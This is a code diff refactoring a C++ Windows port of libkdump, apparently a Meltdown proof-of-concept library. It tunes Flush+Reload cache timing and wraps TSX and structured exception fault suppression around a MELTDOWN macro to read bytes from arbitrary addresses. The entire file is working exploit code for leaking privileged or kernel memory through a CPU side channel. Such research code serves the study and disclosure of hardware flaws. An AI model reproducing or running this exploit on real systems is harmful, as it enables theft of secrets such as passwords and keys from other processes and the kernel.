@@ -22,15 +22,18 @@
 
 namespace kdump {
 
-	libkdump_config_t libkdump_auto_config = { 0 };
+	config_t libkdump_auto_config = { 0 };
 
 	static std::byte* mem = nullptr;
 	static std::vector<std::thread> load_threads;
 	static std::atomic<std::size_t> end_threads;
 	static size_t phys = 0;
-	static int dbg = 0;
+	static bool dbg = 0;
 
-	static libkdump_config_t config;
+	constexpr std::size_t probe_count = 0x100;
+	constexpr std::size_t page_size = 0x1000;
+
+	static config_t config;
 
 	static __forceinline void meltdown_nonull(void) {
 		uint64_t byte;
@@ -97,42 +100,25 @@ namespace kdump {
 		va_end(ap);
 	}
 
-	static __forceinline uint64_t rdtsc() {
-		uint64_t a;
-		uint32_t c;
-		a = __rdtscp(&c);
-		return a;
-	}
-
 	static __forceinline void maccess(void *p) {
 		*(volatile size_t*)p;
 	}
 
-	static __forceinline void flush(void *p) {
-		_mm_clflush(p);
-	}
-
 	static __forceinline int flush_reload(void *ptr) {
 		uint64_t start = 0, end = 0;
+		uint32_t discard;
 
-		start = rdtsc();
+		_mm_lfence();
+		start = __rdtsc();
 		maccess(ptr);
-		end = rdtsc();
-
-		flush(ptr);
+		end = __rdtscp(&discard);
+		_mm_lfence();
+		_mm_clflush(ptr);
 
 		if(end - start < config.cache_miss_threshold) {
 			return 1;
 		}
 		return 0;
-	}
-
-	static __forceinline unsigned int xbegin(void) {
-		return _xbegin();
-	}
-
-	static __forceinline void xend(void) {
-		_xend();
 	}
 
 	static void nopthread() {
@@ -207,19 +193,24 @@ namespace kdump {
 		size_t dummy[16];
 		size_t *ptr = dummy + 8;
 		uint64_t start = 0, end = 0;
+		uint32_t discard;
 
 		maccess(ptr);
 		for(std::size_t i = 0; i < count; i++) {
-			start = rdtsc();
+			_mm_lfence();
+			start = __rdtsc();
 			maccess(ptr);
-			end = rdtsc();
+			end = __rdtscp(&discard);
+			_mm_lfence();
 			reload_time += (end - start);
 		}
 		for(std::size_t i = 0; i < count; i++) {
-			start = rdtsc();
+			_mm_clflush(ptr);
+			_mm_lfence();
+			start = __rdtsc();
 			maccess(ptr);
-			end = rdtsc();
-			flush(ptr);
+			end = __rdtscp(&discard);
+			_mm_lfence();
 			flush_reload_time += (end - start);
 		}
 		reload_time /= count;
@@ -230,7 +221,7 @@ namespace kdump {
 		debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n", config.cache_miss_threshold);
 	}
 
-	static void auto_config() {
+	static void set_auto_config() {
 		debug(INFO, "Auto configuration\n");
 		detect_fault_handling();
 		detect_flush_reload_threshold();
@@ -239,7 +230,6 @@ namespace kdump {
 		config.load_threads = 1;
 		config.load_type = NOP;
 		config.retries = 10000;
-		config.physical_offset = 0;
 	}
 
 	static int check_config() {
@@ -252,15 +242,15 @@ namespace kdump {
 		return 0;
 	}
 
-	libkdump_config_t libkdump_get_autoconfig() {
-		auto_config();
+	config_t libkdump_get_autoconfig() {
+		set_auto_config();
 		return config;
 	}
 
-	int libkdump_init(const libkdump_config_t configuration) {
+	int libkdump_init(const config_t configuration) {
 		config = configuration;
-		if(memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
-			auto_config();
+		if(memcmp(&config, &libkdump_auto_config, sizeof(config_t)) == 0) {
+			set_auto_config();
 		}
 
 		int err = check_config();
@@ -269,14 +259,14 @@ namespace kdump {
 			return -1;
 		}
 
-		mem = static_cast<std::byte*>(::VirtualAlloc(nullptr, 0x1000 * 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
+		mem = static_cast<std::byte*>(::VirtualAlloc(nullptr, page_size * probe_count, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
 		if(!mem) {
 			return -1;
 		}
-		std::memset(mem, 0xab, 0x1000 * 0x100);
+		std::memset(mem, 0xab, page_size * probe_count);
 
-		for(std::size_t i = 0; i < 0x100; i++) {
-			flush(mem + i * 0x1000);
+		for(std::size_t i = 0; i < probe_count; i++) {
+			_mm_clflush(mem + i * page_size);
 		}
 		using thread_type = void(*)();
 		thread_type thread_func = nullptr;
@@ -311,34 +301,30 @@ namespace kdump {
 		return 0;
 	}
 
-	size_t libkdump_phys_to_virt(size_t addr) {
-		return addr + config.physical_offset;
-	}
-
-	void libkdump_enable_debug(int enable) {
+	void libkdump_enable_debug(bool enable) {
 		dbg = enable;
 	}
 
 	static std::size_t __forceinline read_value() {
 		std::size_t hit = 0;
-		for(std::size_t i = 0; i < 256; i++) {
-			if(flush_reload(mem + i * 4096)) {
+		for(std::size_t i = 0; i < probe_count; i++) {
+			if(flush_reload(mem + i * page_size)) {
 				hit = i + 1;
 			}
 		}
 		return hit - 1;
 	}
 
-	std::size_t libkdump_read_tsx() {
+	std::size_t read_tsx() {
 		std::size_t retries = config.retries + 1;
 
 		while(retries--) {
-			if(xbegin() == _XBEGIN_STARTED) {
+			if(_xbegin() == _XBEGIN_STARTED) {
 				MELTDOWN;
-				xend();
+				_xend();
 			}
-			for(std::size_t i = 0; i < 256; i++) {
-				if(flush_reload(mem + i * 4096)) {
+			for(std::size_t i = 0; i < probe_count; i++) {
+				if(flush_reload(mem + i * page_size)) {
 					if(i >= 1) {
 						return i;
 					}
@@ -348,7 +334,7 @@ namespace kdump {
 		return 0;
 	}
 
-	std::size_t libkdump_read_seh() {
+	std::size_t read_seh() {
 		std::size_t retries = config.retries + 1;
 
 		while(retries--) {
@@ -358,8 +344,8 @@ namespace kdump {
 				;
 			}
 
-			for(std::size_t i = 0; i < 256; i++) {
-				if(flush_reload(mem + i * 4096)) {
+			for(std::size_t i = 0; i < probe_count; i++) {
+				if(flush_reload(mem + i * page_size)) {
 					if(i >= 1) {
 						return i;
 					}
@@ -369,33 +355,33 @@ namespace kdump {
 		return 0;
 	}
 
-	std::byte libkdump_read(size_t addr) {
+	std::array<std::byte, 1> libkdump_read(size_t addr) {
 		phys = addr;
 
-		std::uint8_t res_stat[256];
-		for(std::size_t i = 0; i < 256; ++i) {
+		std::uint8_t res_stat[probe_count];
+		for(std::size_t i = 0; i < probe_count; ++i) {
 			res_stat[i] = 0ui8;
 		}
 
 		std::size_t r;
 		for(std::size_t i = 0; i < config.measurements; i++) {
 			if(config.fault_handling == TSX) {
-				r = libkdump_read_tsx();
+				r = read_tsx();
 			} else {
-				r = libkdump_read_seh();
+				r = read_seh();
 			}
 			res_stat[r]++;
 		}
 		std::size_t max_v = 0;
 		std::byte max_i{ 0 };
 
-		for(std::size_t i = 1; i < 256; ++i) {
+		for(std::size_t i = 1; i < probe_count; ++i) {
 			if(res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
 				max_v = res_stat[i];
 				max_i = static_cast<std::byte>(i);
 			}
 		}
-		return max_i;
+		return { max_i };
 	}
 
 }
